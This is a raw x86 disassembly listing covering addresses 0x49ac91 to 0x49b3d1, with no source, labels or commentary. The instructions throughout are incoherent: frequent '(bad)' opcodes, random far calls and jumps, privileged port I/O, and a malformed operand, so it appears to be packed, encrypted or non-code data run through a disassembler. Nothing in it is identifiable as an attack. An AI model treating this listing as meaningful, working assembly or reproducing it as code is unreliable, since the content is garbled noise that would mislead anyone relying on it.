  49ac91:	xchg   esi,eax
  49ac92:	jno    0x49acbf
  49ac94:	aaa    
  49ac95:	push   ecx
  49ac96:	cmp    BYTE PTR [eax],al
  49ac98:	add    BYTE PTR [ebp+0x5c2122b6],al
  49ac9e:	leave  
  49ac9f:	mov    edx,0x2959c6c4
  49aca4:	or     DWORD PTR [ebx+0xf0c2d9],ebx
  49acaa:	lods   eax,DWORD PTR ds:[esi]
  49acab:	pop    ds
  49acac:	mov    ebp,0xab6d7d89
  49acb1:	jl     0x49ac56
  49acb3:	(bad)  
  49acb4:	cmp    esp,DWORD PTR [ecx-0x259277ce]
  49acba:	scas   al,BYTE PTR es:[edi]
  49acbb:	dec    esp
  49acbc:	and    al,0xbd
  49acbe:	daa    
  49acbf:	sub    eax,DWORD PTR [eax]
  49acc1:	mov    eax,0x8d4ae104
  49acc6:	adc    al,0x93
  49acc8:	mov    esi,ebp
  49acca:	pop    ss
  49accb:	dec    eax
  49accc:	push   0x4dda5a5c
  49acd1:	aam    0x51
  49acd3:	jmp    FWORD PTR [ecx]
  49acd5:	dec    ecx
  49acd6:	stc    
  49acd7:	and    al,0x8d
  49acd9:	push   ebp
  49acda:	aam    0x52
  49acdc:	add    al,0xb6
  49acde:	dec    eax
  49acdf:	add    ecx,DWORD PTR [ebx-0x70fd27b0]
  49ace5:	fisttp QWORD PTR [eax+0x51]
  49ace8:	and    DWORD PTR [eax],esi
  49acea:	xor    BYTE PTR [edx],bh
  49acec:	aaa    
  49aced:	in     eax,0xb0
  49acef:	xchg   BYTE PTR [esi-0x36],bh
  49acf2:	dec    eax
  49acf3:	outs   dx,DWORD PTR ds:[esi]
  49acf4:	repnz leave 
  49acf6:	dec    DWORD PTR [eax+0x7eec2150]
  49acfc:	mov    DWORD PTR [edi+0x72],eax
  49acff:	dec    ebp
  49ad00:	or     BYTE PTR [esi+eax*1+0x51],cl
  49ad04:	sub    eax,0x61dc6d2
  49ad09:	push   ecx
  49ad0a:	ins    BYTE PTR es:[edi],dx
  49ad0b:	pusha  
  49ad0c:	jp     0x49ad12
  49ad0e:	test   esp,edi
  49ad10:	xchg   edi,eax
  49ad11:	dec    esi
  49ad12:	and    esp,eax
  49ad14:	enter  0x5d89,0xcc
  49ad18:	mov    DWORD PTR [ebp-0x30],ebx
  49ad1b:	imul   eax,DWORD PTR [eax+0x24],0x5cd42a21
  49ad22:	les    ebx,FWORD PTR [edi-0x14]
  49ad25:	xor    BYTE PTR [edx+0x10],ch
  49ad28:	mov    ebx,0xa4023e8
  49ad2d:	test   al,0xec
  49ad2f:	aas    
  49ad30:	pushf  
  49ad31:	mov    ds:0x108b0117,al
  49ad36:	ror    BYTE PTR [edi-0x77],cl
  49ad39:	pop    edi
  49ad3a:	aaa    
  49ad3b:	mov    cl,0xc1
  49ad3d:	mov    esi,0x39ead644
  49ad42:	in     al,0x5c
  49ad44:	lahf   
  49ad45:	add    edi,ecx
  49ad47:	push   eax
  49ad48:	in     eax,0x4
  49ad4a:	and    BYTE PTR [esi+0x2cc448e7],0x11
  49ad51:	pop    ds
  49ad52:	xor    al,0xed
  49ad54:	push   es
  49ad55:	adc    DWORD PTR [eax-0x10],ebx
  49ad58:	push   eax
  49ad59:	or     al,0x72
  49ad5b:	sbb    al,0x11
  49ad5d:	cwde   
  49ad5e:	lock push esi
  49ad60:	jae    0x49ad42
  49ad62:	inc    ecx
  49ad63:	mov    edi,ebx
  49ad65:	xor    ah,BYTE PTR [eax+0x10]
  49ad68:	jno    0x49ad01
  49ad6a:	lods   eax,DWORD PTR ds:[esi]
  49ad6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49ad6c:	dec    edi
  49ad6d:	or     dl,BYTE PTR ds:0x4049b099
  49ad73:	(bad)  
  49ad75:	or     eax,0x3e128c04
  49ad7a:	(bad)  
  49ad7b:	sahf   
  49ad7c:	scas   al,BYTE PTR es:[edi]
  49ad7d:	rcl    esp,cl
  49ad7f:	test   DWORD PTR [esp+edx*8+0x51],ebx
  49ad83:	dec    ebx
  49ad84:	ja     0x49ada5
  49ad86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49ad87:	jnp    0x49ad63
  49ad89:	dec    ecx
  49ad8a:	push   eax
  49ad8b:	add    al,0x4c
  49ad8d:	or     BYTE PTR [ebx-0x4dee43f8],cl
  49ad93:	adc    eax,ecx
  49ad95:	push   edi
  49ad96:	mov    dh,0x56
  49ad98:	push   ebp
  49ad99:	jae    0x49ad37
  49ad9b:	cmp    esi,edx
  49ad9d:	sbb    bl,ch
  49ad9f:	add    al,0xeb
  49ada1:	push   esi
  49ada2:	add    ch,bl
  49ada4:	or     eax,DWORD PTR [esi-0x45b267c7]
  49adaa:	or     eax,0x6bee60c0
  49adaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49adb0:	ss test al,0x20
  49adb3:	mov    fs,WORD PTR [esi+ebp*2]
  49adb6:	pop    DWORD PTR [edx+edi*1]
  49adb9:	hlt    
  49adba:	xchg   edx,eax
  49adbb:	sub    DWORD PTR [eax-0x50],0x58
  49adbf:	stos   BYTE PTR es:[edi],al
  49adc0:	jne    0x49adf5
  49adc2:	pop    ecx
  49adc3:	mov    ah,0xab
  49adc5:	mov    dl,0x81
  49adc7:	syscall 
  49adc9:	ds push ecx
  49adcb:	cmp    eax,edx
  49adcd:	pop    ss
  49adce:	sub    BYTE PTR [eax+0x12bf12b9],0x4c
  49add5:	in     al,dx
  49add6:	adc    al,BYTE PTR [esi]
  49add8:	push   ss
  49add9:	imul   ebx,DWORD PTR [edx-0x612356ff],0x2c
  49ade0:	push   0x75306e57
  49ade5:	sub    al,0xa4
  49ade7:	sbb    al,0x3b
  49ade9:	dec    ecx
  49adea:	ja     0x49ae42
  49adec:	addr16 jp 0x49ae22
  49adef:	jmp    DWORD PTR [ecx+0x4d]
  49adf2:	jg     0x49adb4
  49adf4:	ins    DWORD PTR es:[edi],dx
  49adf5:	ror    DWORD PTR [ebp+0x26],cl
  49adf8:	push   ebx
  49adf9:	bound  esi,QWORD PTR [edi]
  49adfb:	jne    0x49ae14
  49adfd:	lds    eax,FWORD PTR [edi+esi*4]
  49ae00:	fstp   DWORD PTR [ebx+0x1e]
  49ae03:	test   BYTE PTR [ebx-0x4f],al
  49ae06:	push   esp
  49ae07:	test   BYTE PTR [ebx],cl
  49ae09:	sub    al,0x0
  49ae0b:	pop    esp
  49ae0c:	inc    eax
  49ae0d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  49ae0f:	sbb    BYTE PTR [edx+0x3293c00e],dl
  49ae15:	leave  
  49ae16:	xchg   bh,bl
  49ae18:	icebp  
  49ae19:	dec    edx
  49ae1a:	aad    0xc0
  49ae1c:	cmp    ebx,0xffffffd8
  49ae1f:	fwait
  49ae20:	and    al,0x75
  49ae22:	in     al,dx
  49ae23:	test   al,ah
  49ae25:	mov    esi,0x44570f17
  49ae2a:	add    edx,esi
  49ae2c:	push   edx
  49ae2d:	shl    DWORD PTR [edx],cl
  49ae2f:	and    eax,0xc8a67536
  49ae34:	push   ds
  49ae35:	out    dx,al
  49ae36:	inc    ebp
  49ae37:	sti    
  49ae38:	or     BYTE PTR [ecx-0x71c3c4ca],0x6b
  49ae3f:	dec    edi
  49ae40:	les    edi,FWORD PTR ds:0x59006c72
  49ae46:	retf   
  49ae47:	mov    al,0x7c
  49ae49:	sbb    BYTE PTR cs:[ebx+0x1975c410],ah
  49ae50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49ae51:	gs mov al,0x1
  49ae54:	dec    esp
  49ae55:	or     BYTE PTR [ebp+0x7f],ch
  49ae58:	stos   DWORD PTR es:[edi],eax
  49ae59:	push   0x58
  49ae5b:	and    ah,BYTE PTR [edx+ebp*2-0x7e550bf8]
  49ae62:	popf   
  49ae63:	push   es
  49ae64:	inc    ecx
  49ae65:	add    dl,BYTE PTR [eax-0x66]
  49ae68:	push   eax
  49ae69:	das    
  49ae6a:	cmp    ecx,DWORD PTR [esi+0x70d458a4]
  49ae70:	inc    edx
  49ae71:	or     al,0xa8
  49ae73:	mov    edi,es
  49ae75:	dec    esi
  49ae76:	xchg   esi,eax
  49ae77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49ae78:	jge    0x49ae3a
  49ae7a:	mov    al,0x77
  49ae7c:	mov    al,0x96
  49ae7e:	ins    DWORD PTR es:[edi],dx
  49ae7f:	jb     0x49aeaf
  49ae81:	mov    al,0x90
  49ae83:	jp     0x49ae91
  49ae85:	inc    eax
  49ae86:	adc    BYTE PTR [ebx-0x1b],ch
  49ae89:	fadd   DWORD PTR [eax+ebx*1]
  49ae8c:	loopne 0x49aea6
  49ae8e:	call   0x672c:0x70116a70
  49ae95:	adc    ebx,DWORD PTR [edi-0x25]
  49ae98:	fstp   DWORD PTR [eax+0x5e791a48]
  49ae9e:	add    ecx,DWORD PTR [esi+0x34]
  49aea1:	push   ds
  49aea2:	sub    DWORD PTR [edi],0x2257297c
  49aea8:	mov    esp,0xe826a3bc
  49aead:	mov    bh,0xa6
  49aeaf:	js     0x49aecb
  49aeb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49aeb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49aeb3:	push   esi
  49aeb4:	cmc    
  49aeb5:	ror    BYTE PTR [ebp-0x7645e2d6],0xb8
  49aebc:	dec    ebx
  49aebd:	(bad)  [esi+ebx*1+0x1379c0d4]
  49aec4:	mov    dl,0x7a
  49aec6:	or     eax,edi
  49aec8:	rcl    bh,0x7a
  49aecb:	(bad)  
  49aecc:	mov    ebx,esp
  49aece:	cmp    eax,0x79c23f66
  49aed3:	dec    ebp
  49aed4:	dec    edi
  49aed5:	fiadd  WORD PTR [edi]
  49aed7:	ror    BYTE PTR [eax+esi*8-0x30],cl
  49aedb:	js     0x49aee2
  49aedd:	or     bh,cl
  49aedf:	fisubr DWORD PTR [ebx]
  49aee1:	cpuid  
  49aee3:	add    al,0x8a
  49aee5:	sub    dl,BYTE PTR [ecx+eax*4]
  49aee8:	(bad)  
  49aee9:	imul   ebx,DWORD PTR [ebp+0x2e],0xd8b188aa
  49aef0:	xchg   edx,eax
  49aef1:	mov    ss,WORD PTR [ebx+0x2d47efa3]
  49aef7:	jbe    0x49af75
  49aef9:	push   edx
  49aefa:	xor    edi,eax
  49aefc:	sub    BYTE PTR [edi],ch
  49aefe:	test   BYTE PTR [eax+0x1161008d],bl
  49af04:	sub    al,bl
  49af06:	sbb    eax,0x944edc1
  49af0b:	sub    eax,0x626f954e
  49af10:	or     esp,ecx
  49af12:	push   ecx
  49af13:	or     ch,BYTE PTR [esi+0x5c]
  49af16:	jnp    0x49af8d
  49af18:	push   es
  49af19:	loope  0x49aeed
  49af1b:	push   cs
  49af1c:	add    BYTE PTR [ebx+0x129fe4e],al
  49af22:	setle  BYTE PTR [eax]
  49af25:	dec    edx
  49af26:	push   edi
  49af27:	xor    bl,BYTE PTR [edi]
  49af29:	inc    ebx
  49af2a:	mov    eax,0xe82f68f7
  49af2f:	pop    ebp
  49af30:	or     DWORD PTR [esi-0x4d],edx
  49af33:	(bad)  
  49af34:	cmc    
  49af35:	(bad)  
  49af36:	adc    BYTE PTR [ebx],cl
  49af38:	xchg   edx,eax
  49af39:	rcl    BYTE PTR [edi],cl
  49af3b:	sub    BYTE PTR ss:[ecx+0x78b2b9d7],cl
  49af42:	sub    BYTE PTR [eax],cl
  49af44:	jo     0x49af99
  49af46:	push   cs
  49af47:	ror    DWORD PTR [edi],0x58
  49af4a:	pop    ss
  49af4b:	cld    
  49af4c:	pop    esp
  49af4d:	push   ecx
  49af4e:	jge    0x49aed2
  49af50:	jle    0x49aed8
  49af52:	cs es inc ebp
  49af55:	xchg   BYTE PTR [ecx-0x79],dl
  49af58:	sub    BYTE PTR [edx-0x1f],cl
  49af5b:	dec    edx
  49af5c:	adc    al,bl
  49af5e:	mov    ah,0x8d
  49af60:	xor    cl,BYTE PTR [esi]
  49af62:	xor    DWORD PTR [eax],0x8142a4b7
  49af68:	inc    eax
  49af69:	pop    esp
  49af6a:	sbb    BYTE PTR [ebp+0x6a152e3d],cl
  49af70:	pop    es
  49af71:	mov    DWORD PTR [edx+0x38],eax
  49af74:	or     DWORD PTR [eax+ebp*2+0x1a],ecx
  49af78:	add    cl,bh
  49af7a:	cmp    dh,BYTE PTR [esi+0x38]
  49af7d:	leave  
  49af7e:	add    BYTE PTR [esi+0x0],dl
  49af81:	mov    edx,0x525701b7
  49af86:	xor    BYTE PTR [ebp+0x391fc045],dh
  49af8c:	xor    al,0x62
  49af8e:	cmp    BYTE PTR [esi+ebx*4-0x80],ch
  49af92:	mov    eax,DWORD PTR [eax-0x2332e0c0]
  49af98:	leave  
  49af99:	mov    BYTE PTR gs:[ebx+0x0],bl
  49af9d:	outs   dx,BYTE PTR ds:[esi]
  49af9e:	pop    esp
  49af9f:	inc    ebx
  49afa0:	push   esp
  49afa1:	jne    0x49af2d
  49afa3:	imul   ecx,DWORD PTR [esi],0x70
  49afa6:	xchg   edx,eax
  49afa7:	sub    cl,BYTE PTR [esi]
  49afa9:	adc    BYTE PTR es:[ecx+eax*2+0x3a4504b0],al
  49afb1:	loop   0x49af4c
  49afb3:	adc    BYTE PTR [esi],cl
  49afb5:	fdivp  st(1),st
  49afb7:	not    DWORD PTR [ebp+edx*2-0x76dd33dd]
  49afbe:	push   cs
  49afbf:	sub    BYTE PTR [eax+0x61],cl
  49afc2:	mov    ebx,0x9c3e8ae9
  49afc7:	mov    BYTE PTR [esp+esi*2+0x30],bl
  49afcb:	daa    
  49afcc:	dec    esp
  49afcd:	inc    ecx
  49afce:	mov    DWORD PTR [eax+eax*4-0x49],ecx
  49afd2:	or     DWORD PTR [edx+ebx*8+0x54],edi
  49afd6:	nop
  49afd7:	cmp    DWORD PTR [esi-0x4f],edi
  49afda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49afdb:	dec    edx
  49afdc:	pop    ss
  49afdd:	mov    esp,DWORD PTR [edi+0x5fcdd2ad]
  49afe3:	mul    eax
  49afe5:	sub    edx,DWORD PTR [edi+eax*1-0x69df4834]
  49afec:	pop    ebx
  49afed:	iret   
  49afee:	cmp    esi,esi
  49aff0:	jg     0x49afcb
  49aff2:	arpl   WORD PTR [edx],bp
  49aff4:	sbb    DWORD PTR [eax+0x73],esi
  49aff7:	nop
  49aff8:	pop    ebx
  49aff9:	push   0x36
  49affb:	icebp  
  49affc:	push   es
  49affd:	pop    edi
  49affe:	xlat   BYTE PTR ds:[ebx]
  49afff:	sub    ecx,0x37
  49b002:	dec    DWORD PTR cs:[eax]
  49b005:	pop    ds
  49b006:	or     DWORD PTR [ebp+0x4e],ecx
  49b009:	rcr    BYTE PTR [edx+0x4c],1
  49b00c:	nop
  49b00d:	cld    
  49b00e:	pop    esp
  49b00f:	or     al,BYTE PTR [esi]
  49b011:	cmp    al,BYTE PTR [esi]
  49b013:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49b014:	mov    dl,BYTE PTR [eax+0x4e]
  49b017:	aad    0xbd
  49b019:	out    dx,al
  49b01a:	mov    cl,BYTE PTR [bx+si+0x4674]
  49b01f:	or     eax,DWORD PTR [ebp-0x30eeaf10]
  49b025:	push   ds
  49b026:	xor    al,0xb
  49b028:	shl    edx,0x9f
  49b02b:	jbe    0x49b034
  49b02d:	es mov bl,0x1
  49b030:	dec    edx
  49b031:	push   edx
  49b032:	or     BYTE PTR ds:0x8588fc41,cl
  49b038:	pusha  
  49b039:	dec    ebp
  49b03a:	pop    ebp
  49b03b:	aas    
  49b03c:	mov    ebp,0x4cae8290
  49b041:	pop    ecx
  49b042:	(bad)  
  49b043:	out    dx,al
  49b044:	dec    esi
  49b045:	in     ax,dx
  49b047:	push   edx
  49b048:	mov    edx,0x6ecdfd5e
  49b04d:	repz or al,0x4e
  49b050:	or     BYTE PTR [edi+0x505202ef],cl
  49b056:	fsub   QWORD PTR [esp+edx*2]
  49b059:	inc    BYTE PTR [edi]
  49b05b:	lahf   
  49b05c:	or     WORD PTR [edi+0x308b7472],ax
  49b063:	cmp    al,0x18
  49b065:	and    eax,DWORD PTR [esp+ebp*4-0x7b]
  49b069:	push   ecx
  49b06a:	fmulp  st(5),st
  49b06c:	xor    BYTE PTR [ebp+0x75c163d7],0x34
  49b073:	neg    DWORD PTR [eax+0x7308ae18]
  49b079:	sar    BYTE PTR [ecx+0x68012c80],cl
  49b07f:	aaa    
  49b080:	pop    es
  49b081:	inc    esp
  49b082:	or     al,0x66
  49b084:	das    
  49b085:	inc    esp
  49b086:	cwde   
  49b087:	nop
  49b088:	loopne 0x49b098
  49b08a:	ror    DWORD PTR [edx+eax*4],0x7d
  49b08e:	push   0xde8332b0
  49b093:	mov    bl,0xf
  49b095:	loopne 0x49b024
  49b097:	dec    ebx
  49b098:	add    DWORD PTR [esp+eax*2+0x6],edi
  49b09c:	adc    dh,bl
  49b09e:	add    eax,0xd2138400
  49b0a3:	je     0x49b0fb
  49b0a5:	adc    al,0x82
  49b0a7:	or     edx,DWORD PTR [edi]
  49b0a9:	dec    edx
  49b0aa:	xor    eax,DWORD PTR [ecx+0x2e]
  49b0ad:	mov    al,BYTE PTR ds:[eax]
  49b0b0:	xor    al,0x4
  49b0b3:	js     0x49b07e
  49b0b5:	pushf  
  49b0b6:	pusha  
  49b0b7:	(bad)
  49b0bb:	dec    edi
  49b0bc:	hlt    
  49b0bd:	and    ch,BYTE PTR [esi+0x37]
  49b0c0:	cld    
  49b0c1:	push   es
  49b0c2:	iret   
  49b0c3:	das    
  49b0c4:	push   esp
  49b0c5:	xor    al,BYTE PTR [edx]
  49b0c7:	dec    BYTE PTR [ecx-0x5b]
  49b0ca:	cld    
  49b0cb:	(bad)  
  49b0cd:	sbb    DWORD PTR [ebx],0xffffffc0
  49b0d0:	out    0x43,eax
  49b0d2:	xrelease mov BYTE PTR [eax+edi*4-0x5cb83de],bh
  49b0da:	sub    al,0x6
  49b0dc:	adc    DWORD PTR [edi],0xaa38578d
  49b0e2:	or     al,0x92
  49b0e4:	adc    ebp,ecx
  49b0e6:	and    cl,BYTE PTR [ebx]
  49b0e8:	dec    eax
  49b0e9:	mov    al,BYTE PTR [eax+0x3e]
  49b0ec:	xor    eax,0xcf99489
  49b0f1:	mov    esp,0x48206a6e
  49b0f6:	pop    ebp
  49b0f7:	(bad)  
  49b0f8:	fld    QWORD PTR [esi]
  49b0fa:	cmp    BYTE PTR [ebx+eax*1-0x60b6d8df],ah
  49b101:	sub    eax,0x3820ce02
  49b106:	pop    ebx
  49b107:	enter  0x4016,0xe7
  49b10b:	sub    al,0x8d
  49b10d:	or     DWORD PTR [ecx+0x32],ecx
  49b110:	les    edx,FWORD PTR [edx+0x248b0eb0]
  49b116:	pop    eax
  49b117:	mov    ?,WORD PTR [edx+ebx*8-0x5c010e73]
  49b11e:	aad    0x47
  49b120:	call   0xfc7f26c
  49b125:	xchg   DWORD PTR [ecx-0x7b63b205],ebp
  49b12b:	lock scas al,BYTE PTR es:[edi]
  49b12d:	scas   al,BYTE PTR es:[edi]
  49b12e:	inc    edx
  49b12f:	and    DWORD PTR [eax*8+0x11130849],0x30b9832c
  49b13a:	shl    DWORD PTR [edx],cl
  49b13c:	fcomi  st,st(4)
  49b13e:	adc    ecx,edi
  49b140:	fist   WORD PTR [edx+0x10]
  49b143:	dec    edx
  49b144:	xor    al,0xae
  49b146:	cmp    DWORD PTR [edi+esi*4-0x22dd960a],ebp
  49b14d:	fstp   QWORD PTR [ebx]
  49b14f:	cmp    DWORD PTR ds:0x56f941d6,edx
  49b155:	mov    ch,0xd5
  49b157:	adc    bl,BYTE PTR [esi+0x2117ac46]
  49b15d:	mov    edi,0xc35b8ba4
  49b162:	push   esi
  49b163:	(bad)  
  49b164:	jne    0x49b188
  49b166:	call   0xf601:0x23c7cc3
  49b16d:	lods   eax,DWORD PTR ds:[esi]
  49b16e:	pusha  
  49b16f:	lea    eax,[ebx-0x3c2aafe8]
  49b175:	push   ebp
  49b176:	lods   al,BYTE PTR ds:[esi]
  49b177:	in     al,dx
  49b178:	ror    DWORD PTR [esp+0x13],1
  49b17c:	je     0x49b12f
  49b17e:	push   es
  49b17f:	inc    edi
  49b180:	sub    al,0xd5
  49b182:	dec    ebx
  49b183:	hlt    
  49b184:	ret    0x485b
  49b187:	into   
  49b188:	sub    eax,0x9c510b63
  49b18d:	mov    dl,BYTE PTR [ecx+eax*8-0x76]
  49b191:	cmc    
  49b192:	mov    BYTE PTR ss:[ebx],dl
  49b195:	adc    eax,0x583b3bed
  49b19a:	mov    bh,0x6e
  49b19c:	mov    ds:0x5b11ed73,al
  49b1a1:	xchg   DWORD PTR [ecx],edx
  49b1a3:	sub    edi,ebp
  49b1a5:	test   ch,0xac
  49b1a8:	inc    esp
  49b1a9:	xor    DWORD PTR [edi-0x75],0x6eb3009
  49b1b0:	xchg   DWORD PTR [esi+edx*4],edi
  49b1b3:	inc    eax
  49b1b4:	adc    ecx,DWORD PTR [edi-0x7cde6a48]
  49b1ba:	mov    DWORD PTR [ecx+0x305addf4],ecx
  49b1c0:	and    BYTE PTR [ecx+0x12418d21],al
  49b1c6:	mov    edx,0xf60d2183
  49b1cb:	cdq    
  49b1cc:	inc    edx
  49b1cd:	loope  0x49b192
  49b1cf:	inc    ebp
  49b1d0:	jmp    0x49b1fc
  49b1d2:	xchg   ecx,eax
  49b1d3:	mov    edx,0x3d384187
  49b1d8:	lock call 0x8874:0x690e494c
  49b1e0:	xchg   ecx,eax
  49b1e1:	mov    ch,0x51
  49b1e3:	or     dh,BYTE PTR [edi+0x39796a03]
  49b1e9:	dec    esi
  49b1ea:	push   ebp
  49b1eb:	test   BYTE PTR [ebp+0x3],bl
  49b1ee:	fisubr WORD PTR [edi-0x6b]
  49b1f1:	or     al,0x4c
  49b1f3:	mov    edi,0xf0908be7
  49b1f8:	test   BYTE PTR [edx+0x720289c5],0x4c
  49b1ff:	or     edx,DWORD PTR [edx]
  49b201:	push   es
  49b202:	(bad)  
  49b203:	jecxz  0x49b26f
  49b205:	out    dx,al
  49b206:	pushf  
  49b207:	(bad)  
  49b208:	xchg   edi,eax
  49b209:	jecxz  0x49b24b
  49b20b:	mov    esi,DWORD PTR [edi]
  49b20d:	sub    BYTE PTR [edi],cl
  49b20f:	sbb    ch,BYTE PTR [edx+0x20]
  49b212:	jne    0x49b25e
  49b214:	add    BYTE PTR [ecx],0xf3
  49b217:	gs mov ebp,esi
  49b21a:	cmp    eax,0x42f0bc3
  49b21f:	xchg   edi,eax
  49b220:	std    
  49b221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49b222:	lea    eax,[ebp+0x0]
  49b225:	add    bl,BYTE PTR [edx]
  49b227:	and    DWORD PTR [eax+0x23],edi
  49b22a:	jp     0x49b233
  49b22c:	xor    DWORD PTR [ecx-0xf],esi
  49b22f:	sar    BYTE PTR [ebx+0x5c18c817],cl
  49b235:	sbb    eax,DWORD PTR ss:[edi]
  49b238:	pusha  
  49b239:	mov    DWORD PTR [edx-0x22],eax
  49b23c:	repnz push ecx
  49b23e:	adc    al,0x37
  49b240:	imul   ebp,ebp,0xffffffc1
  49b243:	push   cs
  49b244:	loop   0x49b287
  49b246:	sub    BYTE PTR [edi],dl
  49b248:	es sbb al,0x32
  49b24b:	push   cs
  49b24c:	jae    0x8236313
  49b252:	ficomp DWORD PTR [eax]
  49b254:	push   eax
  49b255:	fs iret 
  49b257:	xchg   esp,eax
  49b258:	aas    
  49b259:	inc    esp
  49b25a:	es pop es
  49b25c:	push   edx
  49b25d:	out    dx,eax
  49b25e:	or     DWORD PTR [ebx+ecx*1+0xc],ebp
  49b262:	sbb    al,0x50
  49b264:	and    DWORD PTR [ebx-0x75],ebx
  49b267:	sub    BYTE PTR [ebx],dh
  49b269:	dec    DWORD PTR [edx-0x49]
  49b26c:	enter  0xd78,0xe
  49b270:	inc    eax
  49b271:	sbb    bh,ch
  49b273:	or     bh,ch
  49b275:	or     al,0x3
  49b277:	push   edi
  49b278:	xchg   edx,eax
  49b279:	dec    esp
  49b27a:	pop    es
  49b27b:	inc    edi
  49b27c:	sbb    al,0x7b
  49b27e:	in     eax,0xeb
  49b280:	test   eax,0x107f8029
  49b285:	in     al,0x12
  49b287:	dec    edi
  49b288:	adc    al,0x3b
  49b28a:	into   
  49b28b:	cmp    al,0xae
  49b28d:	out    0x4,al
  49b28f:	dec    esi
  49b290:	pop    es
  49b291:	rcl    DWORD PTR [edi-0x71],1
  49b294:	jo     0x49b2dc
  49b296:	repz out dx,eax
  49b298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49b299:	dec    ecx
  49b29a:	mov    edi,DWORD PTR [edx]
  49b29c:	mov    edi,DWORD PTR [edi]
  49b29e:	cmp    edi,0x24
  49b2a1:	adc    eax,0x3f01c5f
  49b2a6:	or     eax,0x14011028
  49b2ab:	das    
  49b2ac:	dec    ecx
  49b2ad:	xor    BYTE PTR [ebx],al
  49b2af:	cmc    
  49b2b0:	push   cs
  49b2b1:	inc    esi
  49b2b2:	repnz dec edx
  49b2b4:	inc    edi
  49b2b5:	ffree  st(3)
  49b2b7:	dec    edi
  49b2b8:	loop   0x49b32e
  49b2ba:	shl    BYTE PTR [esi+0x10],cl
  49b2bd:	ins    DWORD PTR es:[edi],dx
  49b2be:	mov    dh,0x81
  49b2c0:	xchg   esi,eax
  49b2c1:	jo     0x49b31c
  49b2c3:	ret    
  49b2c4:	adc    al,0x97
  49b2c6:	shl    BYTE PTR [ecx-0x7fcb135c],1
  49b2cc:	pop    es
  49b2cd:	data16 adc BYTE PTR [esi+0x12],bh
  49b2d1:	in     ax,0x4
  49b2d4:	clc    
  49b2d5:	int    0x49
  49b2d7:	cli    
  49b2d8:	or     bl,ah
  49b2da:	add    eax,0x718f5f99
  49b2df:	lea    ebx,[eax+esi*8-0x64b6dcf7]
  49b2e6:	mov    ebx,0x285bddf0
  49b2eb:	cs push eax
  49b2ed:	(bad)  
  49b2ee:	jl     0x49b314
  49b2f0:	(bad)  
  49b2f1:	mov    dl,0x8
  49b2f3:	jo     0x49b30b
  49b2f5:	xchg   esi,eax
  49b2f6:	and    al,0xa4
  49b2f8:	ds inc eax
  49b2fa:	rcr    DWORD PTR [ecx+0x48],0x89
  49b2fe:	pop    esi
  49b2ff:	push   cs
  49b300:	sbb    edi,DWORD PTR [ecx+ebx*1-0x4f]
  49b304:	xor    eax,0x706dbc7d
  49b309:	ds push eax
  49b30b:	cmp    DWORD PTR [ebp+0x65],0xc91d5e2
  49b312:	xor    eax,0x91f8498
  49b317:	mov    ch,0xb4
  49b319:	and    al,0xd0
  49b31b:	inc    ecx
  49b31c:	add    al,0xe1
  49b31e:	or     BYTE PTR [esi+eax*8+0x3d],ch
  49b322:	cmp    BYTE PTR [edx],0x60
  49b325:	sub    bl,BYTE PTR [ebp-0x13ffdb76]
  49b32b:	push   edi
  49b32c:	lods   eax,DWORD PTR ds:[esi]
  49b32d:	and    al,0xa1
  49b32f:	repnz mov ds:0x52471097,al
  49b335:	in     eax,dx
  49b336:	or     DWORD PTR [eax],0x8b90143c
  49b33c:	xor    al,0x22
  49b33e:	ss mov al,0x32
  49b341:	add    BYTE PTR [edi],dl
  49b343:	retf   0xc448
  49b346:	mov    eax,0xac058412
  49b34b:	das    
  49b34c:	rcl    cl,0x20
  49b34f:	xor    al,0x70
  49b351:	lahf   
  49b352:	xchg   ebx,eax
  49b353:	push   edx
  49b354:	lock push edx
  49b356:	sbb    al,0x6f
  49b358:	int3   
  49b359:	adc    bh,BYTE PTR [ebx+0x20436925]
  49b35f:	push   ds
  49b360:	jmp    0x49b2ed
  49b362:	pop    ecx
  49b363:	dec    BYTE PTR [esp+ebx*1-0x66837f5d]
  49b36a:	out    0x68,eax
  49b36c:	add    al,0x97
  49b36e:	std    
  49b36f:	mov    ebx,0xc49a814e
  49b374:	mov    WORD PTR [esi],gs
  49b376:	shr    BYTE PTR [esi],0x1d
  49b379:	rcr    BYTE PTR [ecx+0x3685a6af],1
  49b37f:	std    
  49b380:	sub    DWORD PTR [edx-0x32],ebp
  49b383:	add    ch,ah
  49b385:	xchg   ecx,eax
  49b386:	cwde   
  49b387:	aas    
  49b388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49b389:	out    0xe,eax
  49b38b:	push   ss
  49b38c:	mov    bl,0x3d
  49b38e:	xchg   esp,eax
  49b38f:	es xchg ebp,eax
  49b391:	ret    0x1b5c
  49b394:	add    edi,esi
  49b396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49b397:	pop    ss
  49b398:	out    0x3,al
  49b39a:	add    dl,BYTE PTR [eax]
  49b39c:	std    
  49b39d:	mov    eax,edi
  49b39f:	and    dh,bl
  49b3a1:	push   ebx
  49b3a2:	enter  0x2edf,0x3d
  49b3a6:	inc    edi
  49b3a7:	sbb    ah,BYTE PTR [edi-0x31af91b6]
  49b3ad:	jmp    0x49b3fa
  49b3af:	push   eax
  49b3b0:	scas   eax,DWORD PTR es:[edi]
  49b3b1:	sbb    al,0xf1
  49b3b3:	sbb    BYTE PTR [esi+0x251f09fc],bh
  49b3b9:	loope  0x49b427
  49b3bb:	adc    ecx,DWORD PTR [ecx+0x18]
  49b3be:	mov    ch,0x21
  49b3c0:	loopne 0x49b3ee
  49b3c2:	inc    edi
  49b3c3:	(bad)  
  49b3c4:	mov    WORD PTR [esi-0x23],cs
  49b3c7:	mov    ebx,0x89bcada9
  49b3cc:	sbb    al,0x56
  49b3ce:	inc    esp
  49b3cf:	dec    edx
  49b3d0:	push   cs
  49b3d1:	push   ds
